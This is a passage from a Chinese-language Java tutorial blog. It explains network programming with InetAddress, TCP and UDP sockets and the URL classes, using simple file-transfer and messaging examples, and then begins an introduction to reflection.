destFile)</span>：文件复制</span><br></pre></td></tr></table></figure>


<h3 id="第16章-网络编程"><a href="#第16章-网络编程" class="headerlink" title="第16章_网络编程"></a>第16章_网络编程</h3><p>Java是 Internet 上的语言，它从语言级上提供了对网络应用程序的支持，程序员能够很容易开发常见的网络应用程序。<br>Java提供的网络类库，可以实现无痛的网络连接，联网的底层细节被隐藏在 Java 的本机安装系统里，由 JVM 进行控制。并且 Java 实现了一个跨平台的网络库，<code>程序员面对的是一个统一的网络编程环境</code>。</p>
<p><strong>软件架构</strong></p>
<ul>
<li><strong>C&#x2F;S架构</strong> ：全称为Client&#x2F;Server结构，是指客户端和服务器结构。常见程序有QQ、美团app、360安全卫士等软件。</li>
<li><strong>B&#x2F;S架构</strong> ：全称为Browser&#x2F;Server结构，是指浏览器和服务器结构。常见浏览器有IE、谷歌、火狐等。</li>
</ul>
<p>两种架构各有优势，但是无论哪种架构，都离不开网络的支持。<strong>网络编程</strong>，就是在一定的协议下，实现两台计算机的通信的程序。</p>
<p><strong>网络编程三要素</strong></p>
<ol>
<li>IP地址和域名</li>
<li>端口号</li>
<li>网络通信协议</li>
</ol>
<h4 id="InetAddress"><a href="#InetAddress" class="headerlink" title="InetAddress"></a>InetAddress</h4><p><strong>InetAddress类的使用</strong></p>
<p>InetAddress类主要表示IP地址，两个子类：Inet4Address、Inet6Address。<br>InetAddress 类没有提供公共的构造器，而是提供 了 如下几个 静态方法来获取InetAddress 实例</p>
<ul>
<li>public static InetAddress <code>getLocalHost()</code></li>
<li>public static InetAddress <code>getByName(String host)</code></li>
<li>public static InetAddress getByAddress(byte[] addr)</li>
</ul>
<p>InetAddress 提供了如下几个常用的方法</p>
<ul>
<li>public String getHostAddress() ：返回 IP 地址字符串（以文本表现形式）</li>
<li>public String getHostName() ：获取此 IP 地址的主机名</li>
<li>public boolean isReachable(int timeout)：测试是否可以达到该地址</li>
</ul>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 常用实例化方式</span></span><br><span class="line">        <span class="comment">//获取指定IP/域名对应的InetAddress的实例，如是域名会进行解析</span></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">inet1</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;192.168.23.31&quot;</span>);</span><br><span class="line">        <span class="comment">// /192.168.23.31</span></span><br><span class="line">        System.out.println(inet1);</span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">inet2</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">        <span class="comment">// www.baidu.com/183.2.172.42</span></span><br><span class="line">        System.out.println(inet2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取本地IP对应的InetAddress的实例</span></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">inet3</span> <span class="operator">=</span> InetAddress.getLocalHost();</span><br><span class="line">        <span class="comment">// shiyefu-computer1/192.168.110.96</span></span><br><span class="line">        System.out.println(inet3);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 常用方法</span></span><br><span class="line">        <span class="comment">//获取域名/IP地址（没有域名时）</span></span><br><span class="line">        <span class="comment">//www.baidu.com</span></span><br><span class="line">        System.out.println(inet2.getHostName());</span><br><span class="line">        <span class="comment">//183.2.172.42</span></span><br><span class="line">        System.out.println(inet2.getHostAddress());</span><br><span class="line">        <span class="comment">//192.168.23.31</span></span><br><span class="line">        System.out.println(inet1.getHostName());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="（重点）TCP-Socket-网络编程"><a href="#（重点）TCP-Socket-网络编程" class="headerlink" title="（重点）TCP Socket 网络编程"></a>（重点）TCP Socket 网络编程</h4><p>网络上具有唯一标识的<strong>IP地址和端口号组合</strong>在一起构成唯一能识别的标识符套接字（Socket）。<br>利用套接字(Socket)开发网络应用程序早已被广泛的采用，以至于成为事实上的标准。网络通信其实就是Socket间的通信。<br>通信的两端都要有Socket，是两台机器间通信的端点。一般主动发起通信的应用程序属客户端，等待通信请求的为服务端。Socket允许程序把网络连接当成一个流，数据在两个Socket间通过IO传输。</p>
<p><strong>Socket分类：</strong></p>
<ul>
<li>流套接字（stream socket）：使用TCP提供可依赖的字节流服务</li>
<li>ServerSocket：此类实现TCP服务器套接字。服务器套接字等待请求通过网络传入。</li>
<li>Socket：此类实现客户端套接字（也可以就叫“套接字”）。套接字是两台机器间通信的端点。</li>
<li>数据报套接字（datagram socket）：使用UDP提供“尽力而为”的数据报服务</li>
<li>DatagramSocket：此类表示用来发送和接收UDP数据报包的套接字。</li>
</ul>
<p><strong>通信模型</strong><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240721113125.png" alt="基于TCP的Socket通信"></p>
<h5 id="ServerSocket类"><a href="#ServerSocket类" class="headerlink" title="ServerSocket类"></a>ServerSocket类</h5><p><strong>ServerSocket类的构造方法：</strong></p>
<ul>
<li>ServerSocket(int port) ：创建绑定到特定端口的服务器套接字。</li>
</ul>
<p><strong>ServerSocket类的常用方法：</strong></p>
<ul>
<li>Socket accept()：侦听并接受到此套接字的连接。</li>
</ul>
<h5 id="socket类"><a href="#socket类" class="headerlink" title="socket类"></a>socket类</h5><p><strong>Socket类的常用构造方法</strong>：</p>
<ul>
<li>public Socket(InetAddress address,int port)：创建一个流套接字并将其连接到指定 IP 地址的指定端口号。</li>
<li>public Socket(String host,int port)：创建一个流套接字并将其连接到指定主机上的指定端口号。</li>
</ul>
<p><strong>Socket类的常用方法</strong>：</p>
<ul>
<li>public InputStream getInputStream()：返回此套接字的输入流，可以用于接收消息</li>
<li>public OutputStream getOutputStream()：返回此套接字的输出流，可以用于发送消息</li>
<li>public InetAddress getInetAddress()：此套接字连接到的远程 IP 地址；如果套接字是未连接的，则返回 null。</li>
<li>public InetAddress getLocalAddress()：获取套接字绑定的本地地址。</li>
<li>public int getPort()：此套接字连接到的远程端口号；如果尚未连接套接字，则返回 0。</li>
<li>public int getLocalPort()：返回此套接字绑定到的本地端口。如果尚未绑定套接字，则返回 -1。</li>
<li>public void close()：关闭此套接字。套接字被关闭后，便不可在以后的网络连接中使用（即无法重新连接或重新绑定）。需要创建新的套接字对象。 关闭此套接字也将会关闭该套接字的 InputStream 和 OutputStream。 </li>
<li>public void shutdownInput()：如果在套接字上调用 shutdownInput() 后从套接字输入流读取内容，则流将返回 EOF（文件结束符）。 即不能在从此套接字的输入流中接收任何数据。</li>
<li>public void shutdownOutput()：禁用此套接字的输出流。对于 TCP 套接字，任何以前写入的数据都将被发送，并且后跟 TCP 的正常连接终止序列。 如果在套接字上调用 shutdownOutput() 后写入套接字输出流，则该流将抛出 IOException。 即不能通过此套接字的输出流发送任何数据。</li>
</ul>
<p><strong>注意：</strong>先后调用Socket的shutdownInput()和shutdownOutput()方法，仅仅关闭了输入流和输出流，并不等于调用Socket的close()方法。在通信结束后，仍然要调用Socket的close()方法，因为只有该方法才会释放Socket占用的资源，比如占用的本地端口号等。</p>
<h5 id="通信示例"><a href="#通信示例" class="headerlink" title="通信示例"></a>通信示例</h5><p>文件传输通信</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileTransmissTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">client</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span>  <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;        </span><br><span class="line">            <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">8989</span>; <span class="comment">// 声明对方端口号</span></span><br><span class="line">            socket = <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;192.168.83.1&quot;</span>, port);</span><br><span class="line"></span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\workinenglish\\1.jpg&quot;</span>);</span><br><span class="line">            fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line"></span><br><span class="line">            os = socket.getOutputStream();</span><br><span class="line">            <span class="comment">// 发送数据</span></span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span>((len = fis.read(buffer))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                os.write(buffer,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;文件传输完成&quot;</span>);</span><br><span class="line">            <span class="comment">// 说明本次数据传输完成</span></span><br><span class="line">            socket.shutdownOutput();</span><br><span class="line"></span><br><span class="line">            inputStream = socket.getInputStream();</span><br><span class="line">            baos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer1 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">5</span>];</span><br><span class="line">            <span class="type">int</span> len1;</span><br><span class="line">            <span class="keyword">while</span>((len1 = inputStream.read(buffer1))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                baos.write(buffer1,<span class="number">0</span>,len1);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (baos!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    baos.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (inputStream!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    inputStream.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (os!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    os.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (fis!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    fis.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (socket!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    socket.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">server</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span>  <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">8989</span>;</span><br><span class="line">            serverSocket = <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(port);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;服务端开启&quot;</span>);</span><br><span class="line">            socket = serverSocket.accept();</span><br><span class="line">            System.out.println(<span class="string">&quot;收到来自&quot;</span>+socket.getInetAddress().getHostAddress()+<span class="string">&quot;的连接&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\workinenglish\\1-1.jpg&quot;</span>);</span><br><span class="line">            fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line"></span><br><span class="line">            inputStream = socket.getInputStream();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span>((len = inputStream.read(buffer))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                fos.write(buffer,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;文件接收完毕&quot;</span>);</span><br><span class="line"></span><br><span class="line">            os = socket.getOutputStream();</span><br><span class="line">            os.write(<span class="string">&quot;服务器成功接收文件&quot;</span>.getBytes());</span><br><span class="line">            <span class="comment">// 说明本次数据传输完成</span></span><br><span class="line">            socket.shutdownOutput();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (baos!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    baos.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (inputStream!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    inputStream.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (os!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    os.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (fos!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    fos.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (socket!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    socket.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="（了解）UDP-Socket-网络编程"><a href="#（了解）UDP-Socket-网络编程" class="headerlink" title="（了解）UDP Socket 网络编程"></a>（了解）UDP Socket 网络编程</h4><h5 id="DatagramSocket类"><a href="#DatagramSocket类" class="headerlink" title="DatagramSocket类"></a>DatagramSocket类</h5><p><strong>DatagramSocket 类的常用方法：</strong></p>
<ul>
<li>public DatagramSocket(int port)创建数据报套接字并将其绑定到本地主机上的指定端口。套接字将被绑定到通配符地址，IP 地址由内核来选择。</li>
<li>public DatagramSocket(int port,InetAddress laddr)创建数据报套接字，将其绑定到指定的本地地址。本地端口必须在 0 到 65535 之间（包括两者）。如果 IP 地址为 0.0.0.0，套接字将被绑定到通配符地址，IP 地址由内核选择。 </li>
<li>public void close()关闭此数据报套接字。 </li>
<li>public void send(DatagramPacket p)从此套接字发送数据报包。DatagramPacket 包含的信息指示：将要发送的数据、其长度、远程主机的 IP 地址和远程主机的端口号。 </li>
<li>public void receive(DatagramPacket p)从此套接字接收数据报包。当此方法返回时，DatagramPacket 的缓冲区填充了接收的数据。数据报包也包含发送方的 IP 地址和发送方机器上的端口号。 此方法在接收到数据报前一直阻塞。数据报包对象的 length 字段包含所接收信息的长度。如果信息比包的长度长，该信息将被截短。 </li>
<li>public InetAddress getLocalAddress()获取套接字绑定的本地地址。</li>
<li>public int getLocalPort()返回此套接字绑定的本地主机上的端口号。 </li>
<li>public InetAddress getInetAddress()返回此套接字连接的地址。如果套接字未连接，则返回 null。</li>
<li>public int getPort()返回此套接字的端口。如果套接字未连接，则返回 -1。</li>
</ul>
<h5 id="DatagramPacket类"><a href="#DatagramPacket类" class="headerlink" title="DatagramPacket类"></a>DatagramPacket类</h5><p><strong>DatagramPacket类的常用方法：</strong></p>
<ul>
<li>public DatagramPacket(byte[] buf,int length)构造 DatagramPacket，用来接收长度为 length 的数据包。 length 参数必须小于等于 buf.length。</li>
<li>public DatagramPacket(byte[] buf,int length,InetAddress address,int port)构造数据报包，用来将长度为 length 的包发送到指定主机上的指定端口号。length 参数必须小于等于 buf.length。</li>
<li>public InetAddress getAddress()返回某台机器的 IP 地址，此数据报将要发往该机器或者是从该机器接收到的。</li>
<li>public int getPort()返回某台远程主机的端口号，此数据报将要发往该主机或者是从该主机接收到的。</li>
<li><code>public byte[] getData()</code>返回数据缓冲区。接收到的或将要发送的数据从缓冲区中的偏移量 offset 处开始，持续 length 长度。</li>
<li><code>public int getLength()</code>返回将要发送或接收到的数据的长度。</li>
</ul>
<h5 id="通信示例-1"><a href="#通信示例-1" class="headerlink" title="通信示例"></a>通信示例</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDPTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sender</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">DatagramSocket</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ds = <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line">            <span class="type">InetAddress</span> <span class="variable">inetAddress</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">8989</span>;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="string">&quot;我是发送端&quot;</span>.getBytes(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建数据包，包含数据，起始字节，结束字节，套接字；</span></span><br><span class="line">            <span class="comment">// 若大于64kb，应当分为多个数据包，前一个数据包的结束字节为当前数据包开始字节</span></span><br><span class="line">            <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(buffer,<span class="number">0</span>,buffer.length,inetAddress,port);</span><br><span class="line">            ds.send(packet);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ds != <span class="literal">null</span>) &#123;</span><br><span class="line">                ds.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">receiver</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">DatagramSocket</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">8989</span>;</span><br><span class="line">            ds = <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(port);</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>*<span class="number">64</span>];</span><br><span class="line">            <span class="comment">// 创建数据包，包含数据，起始字节，结束字节</span></span><br><span class="line">            <span class="comment">// 若大于64kb，应当分为多个数据包，前一个数据包的结束字节为当前数据包开始字节</span></span><br><span class="line">            <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(buffer,<span class="number">0</span>,buffer.length);</span><br><span class="line">            ds.receive(packet);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(packet.getData(),<span class="number">0</span>, packet.getLength());</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ds != <span class="literal">null</span>) &#123;</span><br><span class="line">                ds.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="（重点）URL"><a href="#（重点）URL" class="headerlink" title="（重点）URL"></a>（重点）URL</h4><p>URL(Uniform Resource Locator)：统一资源定位符，它表示 Internet 上某一资源的地址。通过 URL 我们可以访问 Internet 上的各种网络资源，比如最常见的 www，ftp 站点。浏览器通过解析给定的 URL 可以在网络上查找相应的文件或其他资源。 </p>
<p>URL的基本结构由5部分组成：<code>&lt;传输协议&gt;://&lt;主机名&gt;:&lt;端口号&gt;/&lt;文件名&gt;#片段名?参数列表</code></p>
<ul>
<li>片段名：即锚点，例如看小说，直接定位到章节</li>
<li>参数列表格式：参数名&#x3D;参数值&amp;参数名&#x3D;参数值….</li>
</ul>
<p>为了表示URL，java.net 中实现了类 URL。我们可以通过下面的构造器来初始化一个 URL 对象：</p>
<ul>
<li>public URL (String spec)：通过一个表示URL地址的字符串可以构造一个URL对象。</li>
<li>public URL(URL context, String spec)：通过基 URL 和相对 URL 构造一个 URL 对象。</li>
<li>public URL(String protocol, String host, String file);</li>
<li>public URL(String protocol, String host, int port, String file);</li>
</ul>
<p>URL类的构造器都声明抛出非运行时异常，必须要对这一异常进行处理，通常是用 try-catch 语句进行捕获。</p>
<p><img src="/images/image-20220415013546074.png" alt="image-20220415013546074"></p>
<p><strong>常用方法</strong></p>
<p>一个URL对象生成后，其属性是不能被改变的，但可以通过它给定的方法来获取这些属性：</p>
<ul>
<li>public String getProtocol( )   获取该URL的协议名</li>
<li>public String getHost( )      获取该URL的主机名</li>
<li>public String getPort( )      获取该URL的端口号</li>
<li>public String getPath( )      获取该URL的文件路径</li>
<li>public String getFile( )       获取该URL的文件名</li>
<li>public String getQuery(  )    获取该URL的查询名</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8080/examples/myTest.txt&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;getProtocol() :&quot;</span>+url.getProtocol());</span><br><span class="line">System.out.println(<span class="string">&quot;getHost() :&quot;</span>+url.getHost());</span><br><span class="line">System.out.println(<span class="string">&quot;getPort() :&quot;</span>+url.getPort());</span><br><span class="line">System.out.println(<span class="string">&quot;getPath() :&quot;</span>+url.getPath());</span><br><span class="line">System.out.println(<span class="string">&quot;getFile() :&quot;</span>+url.getFile());</span><br><span class="line">System.out.println(<span class="string">&quot;getQuery() :&quot;</span>+url.getQuery());</span><br></pre></td></tr></table></figure>

<h5 id="URLConnection类"><a href="#URLConnection类" class="headerlink" title="URLConnection类"></a>URLConnection类</h5><p>URL的方法 openStream()：能从网络上读取数据<br>若希望输出数据，例如向服务器端的 CGI （公共网关接口-Common Gateway Interface-的简称，是用户浏览器和服务器端的应用程序进行连接的接口）程序发送一些数据，则必须先与URL建立连接，然后才能对其进行读写，此时需要使用 URLConnection 。</p>
<p>URLConnection：表示到URL所引用的远程对象的连接。当与一个URL建立连接时，首先要在一个 URL 对象上通过方法 openConnection() 生成对应的 URLConnection 对象。如果连接过程失败，将产生IOException. </p>
<ul>
<li>URL netchinaren &#x3D; new URL (“<a href="http://www.atguigu.com/index.shtml">http://www.atguigu.com/index.shtml</a>“); </li>
<li>URLConnectonn u &#x3D; netchinaren.openConnection( );</li>
</ul>
<p>通过URLConnection对象获取的输入流和输出流，即可以与现有的CGI程序进行交互。</p>
<ul>
<li><p>public Object getContent( ) throws IOException</p>
</li>
<li><p>public int getContentLength( )</p>
</li>
<li><p>public String getContentType( )</p>
</li>
<li><p>public long getDate( )</p>
</li>
<li><p>public long getLastModified( )</p>
</li>
<li><p><strong>public InputStream getInputStream ( ) throws IOException</strong></p>
</li>
<li><p>public OutputSteram getOutputStream( )throws IOException</p>
</li>
</ul>
<h4 id="三者总结"><a href="#三者总结" class="headerlink" title="三者总结"></a>三者总结</h4><p>TCP和UDP协议的区别</p>
<ol>
<li>需建立连接（三次握手），可靠，大数据量，需要释放已有连接（四次挥手），效率低，</li>
<li>不需要建立连接，不可靠，64K，无需释放资源，开销小，通信效率高，适用于音视频和普通数据传输</li>
</ol>
<p>TCP通信编程</p>
<ol>
<li>三次握手四次挥手均不需要自己编程，自动完成</li>
</ol>
<p>位于网络中的计算机具有唯一的IP地址，这样不同的主机可以互相区分。</p>
<p>客户端－服务器是一种最常见的网络应用程序模型。服务器是一个为其客户端提供某种特定服务的硬件或软件。客户机是一个用户应用程序，用于访问某台服务器提供的服务。端口号是对一个服务的访问场所，它用于区分同一物理计算机上的多个服务。套接字用于连接客户端和服务器，客户端和服务器之间的每个通信会话使用一个不同的套接字。TCP协议用于实现面向连接的会话。</p>
<p>Java 中有关网络方面的功能都定义在 java.net 程序包中。Java 用 InetAddress 对象表示 IP 地址，该对象里有两个字段：主机名(String) 和 IP 地址(int)。</p>
<ul>
<li>类 Socket 和 ServerSocket 实现了基于TCP协议的客户端－服务器程序。Socket是客户端和服务器之间的一个连接，连接创建的细节被隐藏了。这个连接提供了一个安全的数据传输通道，这是因为 TCP 协议可以解决数据在传送过程中的丢失、损坏、重复、乱序以及网络拥挤等问题，它保证数据可靠的传送。</li>
<li>类 URL 和 URLConnection 提供了最高级网络应用。URL 的网络资源的位置来同一表示 Internet 上各种网络资源。通过URL对象可以创建当前应用程序和 URL 表示的网络资源之间的连接，这样当前程序就可以读取网络资源数据，或者把自己的数据传送到网络上去。</li>
</ul>
<h3 id="第17章-反射机制"><a href="#第17章-反射机制" class="headerlink" title="第17章_反射机制"></a>第17章_反射机制</h3><p>（多态） Java程序中，所有的对象都有两种类型：<code>编译时类型</code>和<code>运行时类型</code>，而很多时候对象的编译时类型和运行时类型<code>不一致</code>。<br>例如：某些变量或形参的声明类型是Object类型，但是程序却需要调用该对象运行时类型的方法，该方法不是Object中的方法，那么如何解决呢？<code>Object obj = new String(&quot;hello&quot;);    obj.getClass()</code></p>
<p>解决这个问题，有两种方案：</p>
<ol>
<li>在编译和运行时都完全知道类型的具体信息，在这种情况下，我们可以直接先使用<code>instanceof</code>运算符进行判断，再利用强制类型转换符将其转换成运行时类型的变量即可。</li>
<li>编译时根本无法预知该对象和类的真实信息，程序只能依靠<code>运行时信息</code>来发现该对象和类的真实信息，这就必须使用反射。</li>
</ol>
<p><strong>反射的概述</strong></p>
<p>Reflection（反射）是被视为<code>动态语言</code>的关键，反射机制允许程序在<code>运行期间</code>借助于Reflection API取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。<br>加载完类之后，在堆内存的方法区中就产生了一个Class类型的对象（一个类只有一个Class对象），这个对象就包含了完整的类的结构信息。我们可以通过这个对象看到类的结构。<code>这个对象就像一面镜子，透过这个镜子看到类的结构，所以，我们形象的称之为：反射。</code><br>在日常的</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240721225138.png" alt="反射"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240721230428.png" alt="内存角度反射理解"></p>
<p><strong>Java反射机制提供的功能：</strong></p>
<ul>
<li>在运行时判断任意一个对象所属的类</li>
<li>在运行时构造任意一个类的对象</li>
<li>在运行时判断任意一个类所具有的成员变量和方法</li>
<li>在运行时获取泛型信息</li>
<li>在运行时调用任意一个对象的成员变量和方法，包括私有变量和方法</li>
<li>在运行时处理注解</li>
<li>生成动态代理</li>
</ul>
<p><strong>反射相关的主要API</strong></p>
<p><code>java.lang.Class</code>：代表一个类<br>java.lang.reflect.Method：代表类的方法<br>java.lang.reflect.Field：代表类的成员变量<br>java.lang.reflect.Constructor：代表类的构造器</p>
<p><strong>反射的优缺点</strong></p>
<p><strong>优点：</strong></p>
<ul>
<li>提高了Java程序的灵活性和扩展性，<code>降低了耦合性</code>，提高<code>自适应</code>能力</li>
<li>允许程序创建和控制任何类的对象，无需提前<code>硬编码</code>目标类</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>反射的<code>性能较低</code>。<ul>
